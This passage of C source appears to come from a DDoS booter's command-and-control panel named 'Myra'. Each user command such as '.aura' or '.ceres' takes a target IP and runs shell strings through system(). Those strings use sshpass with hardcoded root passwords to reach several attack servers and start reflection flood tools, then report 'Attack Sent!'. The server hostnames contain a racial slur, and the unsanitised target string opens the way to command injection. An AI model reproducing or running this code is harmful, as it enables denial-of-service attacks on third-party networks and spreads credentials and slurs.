      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mCHIMERA\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mCHIMERA\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -d -m sshpass -p suckyourdad1234@ ssh root@nigger1 /usr/sbin/c2/amp/methods/layer4/v1/reflection/chimera-atk/chimera %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/chimera-atk/chimera.txt 4 -1 120\r\n", iptarget);
      //sprintf(ipkill3, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@mainnig /usr/sbin/c2/amp/methods/layer4/v1/reflection/chimera-atk/chimera %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/chimera-atk/chimera.txt 4 -1 120\r\n", iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mCHIMERA  \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m120\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-CHMRA\x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m2\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".roopthedoop") || strstr(myra_buffer_size, ".roopthedoop")) // System Command Function
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);
      char *ipkill2[5000];
      trim_removev2(ipkill2);
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mGÜNTHER\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mGÜNTHER\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -d -m sshpass -p suckyourdad1234@ ssh root@nigger1 /usr/sbin/c2/amp/methods/layer4/v1/reflection/phoenix-atk/phoenix %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/phoenix-atk/phoenix.txt 4 -1 120\r\n", iptarget);
      //sprintf(ipkill3, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@mainnig /usr/sbin/c2/amp/methods/layer4/v1/reflection/athena-atk/athena %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/athena-atk/athena.txt 4 -1 120\r\n", iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mGÜNTHER  \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m120\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-GUNTR\x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m8\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".jena") || strstr(myra_buffer_size, ".jena")) // System Command Function
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];                                                   // Creating A System Function
      trim_removev2(ipkill2);                                                // Trim [ipkill]
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      char *ipkill4[5000];
      trim_removev2(ipkill4);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mKATURA\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mKATURA\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -d -m sshpass -p suckyourdad1234@ ssh root@nigger1 /usr/sbin/c2/amp/methods/layer4/v1/reflection/phoenix-atk/phoenix %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/phoenix-atk/phoenix.txt 4 -1 120\r\n", iptarget);
      //sprintf(ipkill3, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@mainnig /usr/sbin/c2/amp/methods/layer4/v1/reflection/katura-atk/katura %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/katura-atk/katura.txt 4 -1 120\r\n", iptarget);
      sprintf(ipkill4, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@nigger2 /usr/sbin/c2/amp/methods/layer4/v1/reflection/athena-atk/athena %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/athena-atk/athena.txt 3 -1 120\r\n", iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      system(ipkill4);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mKATURA   \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-KATRA\x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m2\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".cs-drop") || strstr(myra_buffer_size, ".CS-DROP")) // System Command Function
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];                                                   // Creating A System Function
      trim_removev2(ipkill2);                                                // Trim [ipkill]
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      char *ipkill4[5000];
      trim_removev2(ipkill4);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mCSGO-DROP\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mCSGO-DROP\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -d -m sshpass -p suckyourdad1234@ ssh root@nigger1 /usr/sbin/c2/amp/methods/layer4/v1/reflection/csgo-atk/csgo %s 8 -1 60 1.1.1.1\r\n", iptarget);
      //sprintf(ipkill3, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@mainnig /usr/sbin/c2/amp/methods/layer4/v1/reflection/csgo-atk/csgo %s 3 -1 60 1.1.1.1\r\n", iptarget);
      sprintf(ipkill4, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@nigger2 /usr/sbin/c2/amp/methods/layer4/v1/reflection/csgo-atk/csgo %s 4 -1 60 1.1.1.1\r\n", iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      system(ipkill4);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mCSGO-DROP\x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-CSGO \x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m2\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".aura") || strstr(myra_buffer_size, ".AURA")) // System Command Function
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];                                                   // Creating A System Function
      trim_removev2(ipkill2);                                                // Trim [ipkill]
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      char *ipkill4[5000];
      trim_removev2(ipkill4);
      char *ipkill5[5000];
      trim_removev2(ipkill5);
      char *ipkill6[5000];
      trim_removev2(ipkill6);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mAURA\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mAURA\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -d -m sshpass -p suckyourdad1234@ ssh root@nigger1 /usr/sbin/c2/amp/methods/layer4/v1/reflection/athena-atk/athena %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/athena-atk/athena.txt 5 -1 60\r\n", iptarget);
      //sprintf(ipkill3, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@mainnig /usr/sbin/c2/amp/methods/layer4/v1/reflection/athena-atk/athena %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/athena-atk/athena.txt 4 -1 60\r\n", iptarget);
      sprintf(ipkill4, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@nigger2 /usr/sbin/c2/amp/methods/layer4/v1/reflection/athena-atk/athena %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/athena-atk/athena.txt 5 -1 60\r\n", iptarget);
      sprintf(ipkill5, "screen -d -m sshpass -p tillwefall1234@ ssh root@nigger3 /usr/sbin/c2/amp/methods/layer4/v1/reflection/athena-atk/athena %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/athena-atk/athena.txt 8 -1 60\r\n", iptarget);
      sprintf(ipkill6, "screen -d -m sshpass -p tillwefall1234@ ssh root@nigger4 /usr/sbin/c2/amp/methods/layer4/v1/reflection/athena-atk/athena %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/athena-atk/athena.txt 8 -1 60\r\n", iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      system(ipkill4);
      system(ipkill5);
      system(ipkill6);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mAURA     \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-AURA \x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m2\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".pc-ark-drop") || strstr(myra_buffer_size, ".pc-ark-drop")) // System Command Function
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];                                                   // Creating A System Function
      trim_removev2(ipkill2);                                                // Trim [ipkill]
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      char *ipkill4[5000];
      trim_removev2(ipkill4);
      char *ipkill5[5000];
      trim_removev2(ipkill5);
      char *ipkill6[5000];
      trim_removev2(ipkill6);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mARK-DROP\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mARK-DROP\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -d -m sshpass -p suckyourdad1234@ ssh root@nigger1 /usr/sbin/c2/amp/methods/layer4/v1/reflection/arkdrop-atk/ark-drop %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/arkdrop-atk/ark.txt 50 45\r\n", iptarget);
      //sprintf(ipkill3, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@mainnig /usr/sbin/c2/amp/methods/layer4/v1/reflection/arkdrop-atk/ark-drop %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/arkdrop-atk/ark.txt 50 45\r\n", iptarget);
      sprintf(ipkill4, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@nigger2 /usr/sbin/c2/amp/methods/layer4/v1/reflection/arkdrop-atk/ark-drop %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/arkdrop-atk/ark.txt 50 45\r\n", iptarget);
      sprintf(ipkill5, "screen -d -m sshpass -p tillwefall1234@ ssh root@nigger3 /usr/sbin/c2/amp/methods/layer4/v1/reflection/arkdrop-atk/ark-drop %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/arkdrop-atk/ark.txt 50 45\r\n", iptarget);
      sprintf(ipkill6, "screen -d -m sshpass -p tillwefall1234@ ssh root@nigger4 /usr/sbin/c2/amp/methods/layer4/v1/reflection/arkdrop-atk/ark-drop %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/arkdrop-atk/ark.txt 50 45\r\n", iptarget);
      system(ipkill);
      system(ipkill2);
      //system(ipkill3);
      system(ipkill4);
      system(ipkill5);
      system(ipkill6);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mARK-DROP \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-ARKD \x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m2\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".loopy") || strstr(myra_buffer_size, ".LOOPY")) // System Command Function
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];                                                   // Creating A System Function
      trim_removev2(ipkill2);                                                // Trim [ipkill]
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      char *ipkill4[5000];
      trim_removev2(ipkill4);
      char *ipkill5[5000];
      trim_removev2(ipkill5);
      char *ipkill6[5000];
      trim_removev2(ipkill6);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mODIN\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mODIN\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -d -m sshpass -p suckyourdad1234@ ssh root@nigger1 /usr/sbin/c2/amp/methods/layer4/v1/reflection/odin-atk/odin %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/odin-atk/odin.txt 8 -1 60\r\n", iptarget);
      //sprintf(ipkill3, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@mainnig /usr/sbin/c2/amp/methods/layer4/v1/reflection/odin-atk/odin %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/odin-atk/odin.txt 4 -1 60\r\n", iptarget);
      sprintf(ipkill4, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@nigger2 /usr/sbin/c2/amp/methods/layer4/v1/reflection/odin-atk/odin %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/odin-atk/odin.txt 5 -1 60\r\n", iptarget);
      sprintf(ipkill5, "screen -d -m sshpass -p tillwefall1234@ ssh root@nigger3 /usr/sbin/c2/amp/methods/layer4/v1/reflection/odin-atk/odin %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/odin-atk/odin.txt 8 -1 60\r\n", iptarget);
      sprintf(ipkill6, "screen -d -m sshpass -p tillwefall1234@ ssh root@nigger4 /usr/sbin/c2/amp/methods/layer4/v1/reflection/odin-atk/odin %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/odin-atk/odin.txt 8 -1 60\r\n", iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      system(ipkill4);
      system(ipkill5);
      system(ipkill6);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mODIN     \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-ODIN \x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m2\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".ceres") || strstr(myra_buffer_size, ".CERES")) // System Command Function
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];                                                   // Creating A System Function
      trim_removev2(ipkill2);                                                // Trim [ipkill]
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      char *ipkill4[5000];
      trim_removev2(ipkill4);
      char *ipkill5[5000];
      trim_removev2(ipkill5);
      char *ipkill6[5000];
      trim_removev2(ipkill6);
      sprintf(ipkill, "echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mCERES\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]'; echo -e '\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mMethod:\e[38;5;134m[\e[38;5;168mCERES\e[38;5;134m] \e[38;5;168mIP/Port:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]' >> logs/Myra_IPHM_Attack.log\r\n", accounts[find_line].username, iptarget, accounts[find_line].username, iptarget);
      sprintf(ipkill2, "screen -d -m sshpass -p suckyourdad1234@ ssh root@nigger1 /usr/sbin/c2/amp/methods/layer4/v1/reflection/ceres-atk/ceres %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/ceres-atk/ceres.txt 5 -1 60\r\n", iptarget);
      //sprintf(ipkill3, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@mainnig /usr/sbin/c2/amp/methods/layer4/v1/reflection/ceres-atk/ceres %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/ceres-atk/ceres.txt 4 -1 60\r\n", iptarget);
      sprintf(ipkill4, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@nigger2 /usr/sbin/c2/amp/methods/layer4/v1/reflection/ceres-atk/ceres %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/ceres-atk/ceres.txt 5 -1 60\r\n", iptarget);
      sprintf(ipkill5, "screen -d -m sshpass -p tillwefall1234@ ssh root@nigger3 /usr/sbin/c2/amp/methods/layer4/v1/reflection/ceres-atk/ceres %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/ceres-atk/ceres.txt 8 -1 60\r\n", iptarget);
      sprintf(ipkill6, "screen -d -m sshpass -p tillwefall1234@ ssh root@nigger4 /usr/sbin/c2/amp/methods/layer4/v1/reflection/ceres-atk/ceres %s /usr/sbin/c2/amp/methods/layer4/v1/reflection/ceres-atk/ceres.txt 8 -1 60\r\n", iptarget);
      system(ipkill); // System Execution
      system(ipkill2);
      //system(ipkill3);
      system(ipkill4);
      system(ipkill5);
      system(ipkill6);
      sprintf(myra, "\x1b[38;5;225m╔══════════════════╗\r\n\x1b[38;5;225m║ \x1b[38;5;168mAttack Sent!     \x1b[38;5;225m║ \x1b[38;5;168mIP \x1b[38;5;225m/ \x1b[38;5;168mPort\x1b[38;5;225m: \e[38;5;134m%s\r\n\x1b[38;5;225m║ \x1b[38;5;168mMethod\x1b[38;5;225m: \e[38;5;134mCERES    \x1b[38;5;225m║ \x1b[38;5;168mTime\x1b[38;5;225m: \e[38;5;134m1200\r\n\x1b[38;5;225m║ \x1b[38;5;168mUsage\x1b[38;5;225m: \e[38;5;134mIPHM-CRES \x1b[38;5;225m║ \x1b[38;5;168mThreads\x1b[38;5;225m: \e[38;5;134m12\r\n\x1b[38;5;225m╚══════════════════╝\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".zeus") || strstr(myra_buffer_size, ".ZEUS")) // System Command Function
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      char *ipkill2[5000];                                                   // Creating A System Function
      trim_removev2(ipkill2);                                                // Trim [ipkill]
      //char *ipkill3[5000];
      //trim_removev2(ipkill3);
      char *ipkill4[5000];
      trim_removev2(ipkill4);
      char *ipkill5[5000];
      trim_removev2(ipkill5);
      char *ipkill6[5000];
      trim_removev2(ipkill6);
